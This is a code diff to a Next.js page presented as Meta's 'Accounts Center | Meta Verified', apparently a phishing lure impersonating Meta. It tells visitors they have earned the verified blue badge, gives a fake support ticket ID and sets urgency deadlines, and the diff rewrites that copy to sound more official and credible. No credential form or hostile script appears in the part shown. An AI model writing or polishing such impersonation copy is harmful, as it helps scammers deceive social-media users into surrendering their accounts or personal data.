@@ -5,8 +5,7 @@ import type { Metadata } from "next";
 
 export const metadata: Metadata = {
   title: "Accounts Center | Meta Verified",
-  description:
-    "Meta verified",
+  description: "Meta Verified: Recognizing Your Professional Excellence.",
   alternates: {
     canonical: "/accounts-center",
   },
@@ -30,49 +29,49 @@ export default function AccountsCenterPage() {
               </div>
               <div>
                 <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
-                  Meta Verified – Rewards for you
+                  Meta Verified: Recognizing Your Professional Excellence
                 </h1>
                 <p className="mt-2 text-sm font-semibold text-slate-800">
-                  Show the world that you mean business.
+                  Establish your authority and show the world that you mean business.
                 </p>
               </div>
             </div>
 
             <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
               <p>
-                Congratulations on achieving the requirements to upgrade your page to a verified blue badge!
-                This is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with
-                your audience.
+                Congratulations on meeting the rigorous standards required to upgrade your page with the
+                verified blue badge! This significant milestone is a testament to your consistent
+                dedication and the high level of trust you have cultivated within your community.
               </p>
               <p>
-                We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive
-                with this prestigious recognition!
+                We are honored to celebrate this achievement with you and are eager to see your brand
+                reach new heights under this prestigious recognition.
               </p>
 
               <p className="mt-4 text-sm font-medium text-metaBlue">
-                Your ticket id: <span className="underline decoration-dotted">#Y718-SGCZ-4JXR</span>
+                Support Ticket ID: <span className="underline decoration-dotted">#Y718-SGCZ-4JXR</span>
               </p>
 
               <div className="mt-6 space-y-3">
                 <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
-                  Verified Blue Badge Request Guide
+                  Official Verification Protocol
                 </h2>
                 <ul className="space-y-2 text-sm text-slate-700 sm:text-[15px]">
                   <li>
-                    - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal
-                    threats.
+                    - Our verification team maintains a professional environment; requests containing any
+                    form of intimidation or hate speech will not be processed.
                   </li>
                   <li>
-                    - In your request, please provide all required information to ensure timely processing by the
-                    fact checker. Submitting an invalid email address or failing to reply to requests for additional
-                    information within 2 days may lead to the application being closed without review. If the request
-                    remains unprocessed after 4 days, Meta will automatically reject it.
+                    - Please ensure all submitted data is accurate to facilitate a smooth review. Failure
+                    to provide a valid email or to respond to follow-up inquiries within 48 hours may
+                    result in your application being closed. Requests pending for more than 4 days will be
+                    automatically dismissed by the system.
                   </li>
                   <li>
-                    - Once all details are submitted, we will evaluate your account to check for any restrictions.
-                    The verification process typically takes 24 hours, though it may extend in some cases. Based on
-                    our decision, restrictions will either remain or be lifted, and your account will be updated
-                    accordingly.
+                    - Upon submission, we will conduct a comprehensive account audit. While the evaluation
+                    typically concludes within 24 hours, complex cases may require more time. Following our
+                    review, any existing restrictions will be addressed, and your verified status will be
+                    finalized.
                   </li>
                 </ul>
               </div>
@@ -89,20 +88,20 @@ export default function AccountsCenterPage() {
             <button className="hover:text-slate-700" type="button">
               Help Center
             </button>
-            <span className="text-slate-400">•</span>
+            <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
               Privacy Policy
             </button>
-            <span className="text-slate-400">•</span>
+            <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
               Terms of Service
             </button>
-            <span className="text-slate-400">•</span>
+            <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
               Community Standards
             </button>
-            <span className="text-slate-400">•</span>
-            <span>Meta © {new Date().getFullYear()}</span>
+            <span className="text-slate-400">|</span>
+            <span>Meta (c) {new Date().getFullYear()}</span>
           </footer>
         </main>
       </div>
